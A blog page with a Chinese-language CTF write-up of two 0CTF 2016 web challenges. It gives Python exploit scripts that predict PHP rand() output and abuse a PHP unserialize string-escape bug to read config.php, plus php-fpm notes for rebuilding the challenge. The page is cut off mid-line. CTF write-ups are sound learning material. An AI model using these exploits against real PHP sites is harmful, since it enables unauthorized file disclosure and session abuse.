@@ -1,0 +1,714 @@
+<!doctype html>
+<html class="theme-next use-motion ">
+<head>
+    
+
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+  <link rel="stylesheet" type="text/css" href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5"/>
+
+
+
+  <link href='//fonts.useso.com/css?family=Lato:300,400,700,400italic&subset=latin,latin-ext' rel='stylesheet' type='text/css'>
+
+
+<link rel="stylesheet" type="text/css" href="/css/main.css?v=0.4.4"/>
+
+
+    <meta name="description" content="水平不济整日被虐这也不会那也得学脑子太蠢天天垫底这看不懂那学不会" />
+
+
+
+  <meta name="keywords" content="CTF," />
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Hc1m1" type="application/atom+xml" />
+
+
+
+  <link rel="shorticon icon" type="image/x-icon" href="/img/favicon.png?v=0.4.4" />
+
+
+<meta name="description">
+<meta property="og:type" content="article">
+<meta property="og:title" content="0CTF总结">
+<meta property="og:url" content="http://lazysheep.cc/2016/03/14/0x12/index.html">
+<meta property="og:site_name" content="Hc1m1">
+<meta property="og:description">
+<meta property="og:image" content="http://lazysheep.cc/img/0ctf.png">
+<meta property="og:updated_time" content="2016-03-15T10:02:54.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="0CTF总结">
+<meta name="twitter:description">
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var CONFIG = {
+    scheme: '',
+    sidebar: 'post'
+  };
+</script>
+
+    <title> 0CTF总结 // Hc1m1 </title>
+</head>
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+<!--[if lte IE 8]>
+  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
+    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
+      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
+           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
+           style='margin-left:auto;margin-right:auto;display: block;'/>
+    </a>
+  </div>
+<![endif]-->
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?4b6b8b9a09d24f4d4e26c50bd1707fd7";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+<div class="container one-column page-post-detail">
+    <div class="headband"></div>
+    <header style="background: #f5f5f5;" id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+        <div class="header-inner"><h1 class="site-meta">
+  <span class="logo-line-before"><i></i></span>
+  <a href="/" class="brand" rel="start">
+      <span class="logo">
+        <i class="icon-logo"></i>
+      </span>
+      <span class="site-title">Hc1m1</span>
+  </a>
+  <span class="logo-line-after"><i></i></span>
+</h1>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu ">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            <i class="menu-item-icon icon-home"></i> <br />
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            <i class="menu-item-icon icon-categories"></i> <br />
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            <i class="menu-item-icon icon-about"></i> <br />
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            <i class="menu-item-icon icon-archives"></i> <br />
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            <i class="menu-item-icon icon-tags"></i> <br />
+            Tags
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+        </div>
+    </header>
+
+    <main id="main" class="main">
+        <div class="main-inner">
+            <div id="content" class="content">
+                
+
+  <div id="posts" class="posts-expand">
+    
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+
+      
+      
+        <h1 class="post-title" itemprop="name headline">
+          
+          
+            
+              0CTF总结
+            
+          
+        </h1>
+      
+
+      <div class="post-meta">
+        <span class="post-time">
+          Posted on
+          <time itemprop="dateCreated" datetime="2016-03-14T10:25:27+08:00" content="2016-03-14">
+            2016-03-14
+          </time>
+        </span>
+
+        
+          <span class="post-category" >
+            &nbsp; | &nbsp; In
+            
+              <span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a href="/categories/H-blog/" itemprop="url" rel="index"><span itemprop="name">H-blog</span></a></span>
+
+              
+              
+
+            
+          </span>
+        
+
+        
+          
+            <span class="post-comments-count">
+              &nbsp; | &nbsp;
+              <a href="/2016/03/14/0x12/#comments" itemprop="discussionUrl">
+                <span class="post-comments-count ds-thread-count" data-thread-key="2016/03/14/0x12/" itemprop="commentsCount"></span>
+              </a>
+            </span>
+          
+        
+      </div>
+    </header>
+
+    <div class="post-body">
+
+      
+      
+
+      
+        <span itemprop="articleBody"><p><img src="/img/0ctf.png" alt="0ctf"><br><a id="more"></a></p>
+<p>这次的0CTF我们投机取巧派被学院派教做人。。然后发现自己，不会js，不会php。不会python。web题看了两题，都差一点出来。。</p>
+<h1 id="rand_2">rand_2</h1><p>题目源码：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="preprocessor">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">'time'</span>] &amp;&amp; time() - <span class="variable">$_SESSION</span>[<span class="string">'time'</span>] &gt; <span class="number">60</span>) &#123;</span><br><span class="line">	session_destroy();</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">'timeout'</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">'time'</span>] = time();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> rand();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'go'</span>])) &#123;</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">'rand'</span>] = <span class="keyword">array</span>();</span><br><span class="line">	<span class="variable">$i</span> = <span class="number">5</span>;</span><br><span class="line">	<span class="variable">$d</span> = <span class="string">''</span>;</span><br><span class="line">	<span class="keyword">while</span>(<span class="variable">$i</span>--)&#123;</span><br><span class="line">		<span class="variable">$r</span> = (string)rand();</span><br><span class="line">                <span class="variable">$_SESSION</span>[<span class="string">'rand'</span>][] = <span class="variable">$r</span>;</span><br><span class="line">                <span class="variable">$d</span> .= <span class="variable">$r</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">echo</span> md5(<span class="variable">$d</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'check'</span>])) &#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">'check'</span>] === <span class="variable">$_SESSION</span>[<span class="string">'rand'</span>]) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'die'</span>;</span><br><span class="line">		session_destroy();</span><br><span class="line">	&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="preprocessor">?&gt;</span></span></span><br></pre></td></tr></table></figure></p>
+<p>这题看了国外的论文后知道了通过rand()随机出来的伪随机数有一个规律：<code>r[i] = r[i-3] + r[i-31]</code></p>
+<p>这里有一个需要注意的地方，题目服务器是ubuntu<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php&gt; echo <span class="function"><span class="title">getrandmax</span><span class="params">()</span></span> </span><br><span class="line"><span class="number">2147483647</span></span><br></pre></td></tr></table></figure></p>
+<p>linux服务器随机数的范围是0-2147483647, 所以 <code>r[i] = (r[i-3] + r[i-31]) % 2147483648</code><br>payload:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">POC</span>:</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">		self.url = <span class="string">"http://202.120.7.202:8888"</span></span><br><span class="line">		self.url2 = <span class="string">"http://202.120.7.202:8888/?go="</span></span><br><span class="line">		self.url3 = <span class="string">"http://202.120.7.202:8888/?"</span></span><br><span class="line">		self.s = requests.session()</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">(self)</span>:</span></span><br><span class="line">		ran_num = []</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">49</span>):</span><br><span class="line">			req = self.s.get(self.url)</span><br><span class="line">			cont = req.content</span><br><span class="line">			<span class="keyword">try</span>:</span><br><span class="line">				num = re.findall(<span class="string">r'(.+)&lt;code&gt;'</span>,cont)[<span class="number">0</span>]</span><br><span class="line">			<span class="keyword">except</span>:</span><br><span class="line">				<span class="keyword">print</span> i</span><br><span class="line">				exit(-<span class="number">1</span>)</span><br><span class="line">			ran_num(int(num))</span><br><span class="line"></span><br><span class="line">		req = self.s.get(self.url2)</span><br><span class="line">		cont = req.content</span><br><span class="line">		ran_num.append(int(cont[<span class="number">1</span>:-<span class="number">32</span>]))</span><br><span class="line">		md5_num = cont[-<span class="number">32</span>:]</span><br><span class="line">		</span><br><span class="line">		go_num = []</span><br><span class="line">		<span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">			y = <span class="number">50</span> + x</span><br><span class="line">			tem_num1 = (ran_num[y-<span class="number">3</span>] + ran_num[y-<span class="number">31</span>]) % <span class="number">2147483648</span></span><br><span class="line">			ran_num.append(tem_num1)</span><br><span class="line">			go_num.append(str(tem_num1))</span><br><span class="line"></span><br><span class="line">		now_num = <span class="string">""</span>.join(go_num)</span><br><span class="line">		now_md5 = hashlib.md5(now_num).hexdigest()</span><br><span class="line">		<span class="keyword">if</span> md5_num == now_md5:</span><br><span class="line">			<span class="keyword">print</span> <span class="string">"yes"</span></span><br><span class="line">			self.num5 = self.go_num</span><br><span class="line">			self.suc()</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">suc</span><span class="params">(self)</span>:</span></span><br><span class="line">		<span class="keyword">for</span> x <span class="keyword">in</span> self.num5:</span><br><span class="line">			self.url3 += <span class="string">"check[]="</span>+str(x) + <span class="string">"&amp;"</span></span><br><span class="line">		req = self.s.get(self.url3)</span><br><span class="line">		<span class="keyword">print</span> req.content</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	t = POC()</span><br><span class="line">	t.test()</span><br></pre></td></tr></table></figure></p>
+<p>然后我没做出来的问题在于。。。。我不会python..<br>error code:<br><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="atom">ran_num</span>.<span class="atom">append</span>(<span class="atom">int</span>(<span class="atom">cont</span>[<span class="number">1</span>:-<span class="number">33</span>]))</span><br><span class="line"><span class="atom">md5_num</span> = <span class="atom">cont</span>[-<span class="number">33</span>:-<span class="number">1</span>]</span><br></pre></td></tr></table></figure></p>
+<p>然后这题发现没法复现，本地或是自己的服务器中，每次访问rand的seed都会变，就算keep-alive也是。。不知道题目服务器做了啥设置。。。</p>
+<h1 id="piapiapia">piapiapia</h1><p>这题是代码审计，让我知道了原来我不会php<br>大致看了一遍可以看出一处问题：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// update.php</span></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/[^a-zA-Z0-9_]/'</span>, <span class="variable">$_POST</span>[<span class="string">'nickname'</span>]) || strlen(<span class="variable">$_POST</span>[<span class="string">'nickname'</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">'Invalid nickname'</span>);</span><br></pre></td></tr></table></figure></p>
+<p>如果POST或者GET传参除了字符串还可以传递数组，所以如果nickname为数组的话，则可绕过该判断。update.php中之后是将输入序列化，在profile.php中反序列化。所以猜测是序列化这有洞，可是google搜了一通之后。得到的都是Joomla的反序列化截断漏洞。并没有得到啥有用的信息。。</p>
+<p>然后又有一发现<br><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$safe</span> <span class="subst">=</span> <span class="built_in">array</span>(<span class="string">'select'</span>, <span class="string">'insert'</span>, <span class="string">'update'</span>, <span class="string">'delete'</span>, <span class="string">'where'</span>);</span><br><span class="line"><span class="variable">$safe</span> <span class="subst">=</span> <span class="string">'/'</span> <span class="built_in">. </span>implode(<span class="string">'|'</span>, <span class="variable">$safe</span>) <span class="built_in">. </span><span class="string">'/i'</span>;</span><br><span class="line"><span class="keyword">return</span> preg_replace(<span class="variable">$safe</span>, <span class="string">'hacker'</span>, <span class="variable">$string</span>);</span><br></pre></td></tr></table></figure></p>
+<p>如果输入中有where则会变成hacker，多了一个字符，反序列化的时候会出错。。当时并没有想出利用方法。。之后看了wp之后才知道。</p>
+<p>payload:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">POC</span>:</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">		self.data = &#123;<span class="string">"username"</span>: <span class="string">"ddog1"</span>, <span class="string">"password"</span>: <span class="string">"ddog1"</span>&#125;</span><br><span class="line">		self.reg()</span><br><span class="line">		self.login()</span><br><span class="line">		self.fuck()</span><br><span class="line">		self.get_flag()	</span><br><span class="line">			</span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">reg</span><span class="params">(self)</span>:</span></span><br><span class="line">		url = <span class="string">"http://xxx/register.php"</span></span><br><span class="line">		req = requests.post(url, data=self.data)</span><br><span class="line">		<span class="keyword">if</span> req.status_code != <span class="number">200</span>:</span><br><span class="line">			<span class="keyword">print</span> req.content</span><br><span class="line">			exit(-<span class="number">1</span>)</span><br><span class="line">			</span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(self)</span>:</span></span><br><span class="line">		url = <span class="string">"http://xxx:8085/index.php"</span></span><br><span class="line">		req = requests.post(url, data=self.data)</span><br><span class="line">		<span class="keyword">if</span> <span class="keyword">not</span> re.search(<span class="string">"UPDATE|Profile"</span>,req.content):</span><br><span class="line">			<span class="keyword">print</span> req.content</span><br><span class="line">			<span class="keyword">print</span> <span class="string">"login fail！"</span></span><br><span class="line">			exit(-<span class="number">1</span>)</span><br><span class="line">		cookie = req.request.headers[<span class="string">'Cookie'</span>]</span><br><span class="line">		cookie = cookie.split(<span class="string">"="</span>)</span><br><span class="line">		self.cookie = &#123;cookie[<span class="number">0</span>]: cookie[<span class="number">1</span>]&#125;</span><br><span class="line">		</span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">fuck</span><span class="params">(self)</span>:</span></span><br><span class="line">		url = <span class="string">"http://xxx:8085/update.php"</span></span><br><span class="line">		payload = <span class="string">'";&#125;s:5:"photo";s:10:"config.php";&#125;;'</span></span><br><span class="line">		payload = <span class="string">"where"</span> * len(payload) + payload</span><br><span class="line">		f = open(<span class="string">'/tmp/a.jpg'</span>,<span class="string">"w"</span>)</span><br><span class="line">		f.write(<span class="string">"fffff"</span>*<span class="number">1024</span>)</span><br><span class="line">		f.close()</span><br><span class="line">		files = &#123;<span class="string">"photo"</span>: (<span class="string">"fff.jpg"</span>, open(<span class="string">"/tmp/a.jpg"</span>,<span class="string">"rb"</span>))&#125;</span><br><span class="line">		data = &#123;<span class="string">"phone"</span>: <span class="string">"1"</span>*<span class="number">11</span>, <span class="string">"email"</span>: <span class="string">"fffff@qq.com"</span>, <span class="string">"nickname[]"</span>: payload&#125;</span><br><span class="line">		req = requests.post(url, data=data, cookies=self.cookie, files=files)</span><br><span class="line">		<span class="keyword">if</span> <span class="keyword">not</span> re.search(<span class="string">"Success"</span>, req.content):</span><br><span class="line">			<span class="keyword">print</span> req.content</span><br><span class="line">			exit(-<span class="number">1</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">(self)</span>:</span></span><br><span class="line">		url = <span class="string">"http://xxx:8085/profile.php"</span></span><br><span class="line">		req = requests.get(url, cookies=self.cookie)</span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			base = re.findall(<span class="string">'base64,(.+?)"'</span>,req.content)[<span class="number">0</span>]</span><br><span class="line">		<span class="keyword">except</span>:</span><br><span class="line">			<span class="keyword">print</span> req.content</span><br><span class="line">			<span class="keyword">print</span> <span class="string">"crack fail!"</span></span><br><span class="line">			exit(-<span class="number">1</span>)</span><br><span class="line">		<span class="keyword">print</span> <span class="string">"crack success!"</span></span><br><span class="line">		<span class="keyword">print</span> <span class="string">"=========================="</span></span><br><span class="line">		<span class="keyword">print</span> base64.b64decode(base)</span><br><span class="line">		<span class="keyword">print</span> <span class="string">"=========================="</span></span><br><span class="line">		</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	POC()</span><br></pre></td></tr></table></figure></p>
+<p>这题没做出来就是对序列化的理解不清楚。比如一个序列化字符串<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="rule"><span class="attribute">a</span>:<span class="value"><span class="number">1</span>:&#123;i:<span class="number">0</span></span></span>;<span class="rule"><span class="attribute">s</span>:<span class="value"><span class="number">5</span>:<span class="string">"aaaaa"</span></span></span>;&#125;</span><br></pre></td></tr></table></figure></p>
+<p><strong>第一点</strong>，反序列化时，当反序列化完一个序列后，就会停止，比如<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="rule"><span class="attribute">a</span>:<span class="value"><span class="number">1</span>:&#123;i:<span class="number">0</span></span></span>;<span class="rule"><span class="attribute">s</span>:<span class="value"><span class="number">5</span>:<span class="string">"aaaaa"</span></span></span>;&#125;<span class="tag">dfklasfjkal</span></span><br></pre></td></tr></table></figure></p>
+<p>上面的字符串进行反序列化和第一个字符串反序列化是一样的。。。</p>
+<p><strong>第二点</strong>，序列化字符串里没有转义字符。。所以说有了可以闭合序列化的可能，关键在于长度，序列一共由三部分组成，<code>数据类型:长度:数据</code>，看下面的例子<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="preprocessor">&lt;?php</span></span><br><span class="line">var_dump(unserialize(<span class="string">'a:1:&#123;i:0;s:5:"aa";&#125;";&#125;'</span>));</span><br><span class="line"><span class="comment">// out</span></span><br><span class="line"><span class="comment">// array(1) &#123;</span></span><br><span class="line"><span class="comment">//  [0]=&gt;</span></span><br><span class="line"><span class="comment">//  string(5) "aa\";&#125;"</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="preprocessor">?&gt;</span></span></span><br><span class="line">then</span><br><span class="line"><span class="php"><span class="preprocessor">&lt;?php</span></span><br><span class="line">var_dump(unserialize(<span class="string">'a:1:&#123;i:0;s:2:"aa";&#125;";&#125;'</span>));</span><br><span class="line"><span class="comment">// out</span></span><br><span class="line"><span class="comment">// array(1) &#123;</span></span><br><span class="line"><span class="comment">//  [0]=&gt;</span></span><br><span class="line"><span class="comment">//  string(2) "aa"</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="preprocessor">?&gt;</span></span></span><br></pre></td></tr></table></figure></p>
+<p>这就是这题的重点了，但是怎么控制长度呢？就是通过 <code>where -&gt; hacker</code>  然后字符串逃逸。<br>所以得出payload:<br><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = '<span class="string">";&#125;s:5:"</span>photo<span class="string">";s:10:"</span>config.php<span class="string">";&#125;;'</span></span><br><span class="line">payload = <span class="string">"where"</span> * len(payload) + payload</span><br></pre></td></tr></table></figure></p>
+<p>然后是复现这题，在复现的过程中随便学习了下运维。。</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"># 新建组</span><br><span class="line">$ groupadd ctf5</span><br><span class="line"># 新建一个专门用于php-fpm的用户</span><br><span class="line">$ useradd ctf5 -<span class="keyword">M</span> -s /sbin/nologin -<span class="keyword">g</span> ctf5</span><br><span class="line"># 创建pid, sock文件</span><br><span class="line">$ touch /usr/<span class="keyword">local</span>/php/<span class="keyword">var</span>/<span class="keyword">run</span>/php-fpm-ctf5.pid</span><br><span class="line">$ touch /tmp/php-cgi-ctf5.sock</span><br><span class="line"># sock是被nginx使用所以需要把所属用户和用户组改成和nginx一样</span><br><span class="line">$ chown www:www /tmp/php-cgi-ctf5.sock</span><br><span class="line"># 修改nginx虚拟主机文件</span><br><span class="line">$ vim /usr/<span class="keyword">local</span>/nginx/<span class="keyword">conf</span>/vhost/ctf5.<span class="keyword">conf</span></span><br><span class="line">    fastcgi_pass  unix:/tmp/php-cgi-ctf5.sock;    #修改成这样</span><br><span class="line"># 创建php-fpm配置文件</span><br><span class="line">$ cp /usr/<span class="keyword">local</span>/php/etc/php-fpm.<span class="keyword">conf</span> /usr/<span class="keyword">local</span>/php/etc/php-fpm-ctf5.<span class="keyword">conf</span></span><br><span class="line">$ vim /usr/<span class="keyword">local</span>/php/etc/php-fpm-ctf5.<span class="keyword">conf</span></span><br><span class="line">[<span class="keyword">global</span>]</span><br><span class="line">pid = /usr/<span class="keyword">local</span>/php/<span class="keyword">var</span>/<span class="keyword">run</span>/php-fpm-ctf5.pid</span><br><span class="line">error_log = /usr/<span class="keyword">local</span>/php/<span class="keyword">var</span>/<span class="keyword">log</span>/php-fpm-ctf5.<span class="literal">log</span></span><br><span class="line">log_level = notice</span><br><span class="line"></span><br><span class="line">[ctf5]</span><br><span class="line">listen = /tmp/php-cgi-ctf5.sock</span><br><span class="line">listen.backlog = -1</span><br><span class="line">listen.allowed_clients = 127.0.0.1</span><br><span class="line">listen.owner = ctf5</span><br><span class="line">listen.group = ctf5</span><br><span class="line">listen.mode = 0666</span><br><span class="line">user = ctf5</span><br><span class="line">group = ctf5</span><br><span class="line">pm = dynamic</span><br><span class="line">pm.max_children = 10</span><br><span class="line">pm.start_servers = 1</span><br><span class="line">pm.min_spare_servers = 1</span><br><span class="line">pm.max_spare_servers = 6</span><br><span class="line">request_terminate_timeout = 100</span><br><span class="line">request_slowlog_timeout = 0</span><br><span class="line">slowlog = <span class="keyword">var</span>/<span class="keyword">log</span>/slow-ctf5.<span class="literal">log</span></span><br><span class="line"></span><br><span class="line"># 修改/etc/init.<span class="keyword">d</span>/php-fpm</span><br><span class="line">vhost=<span 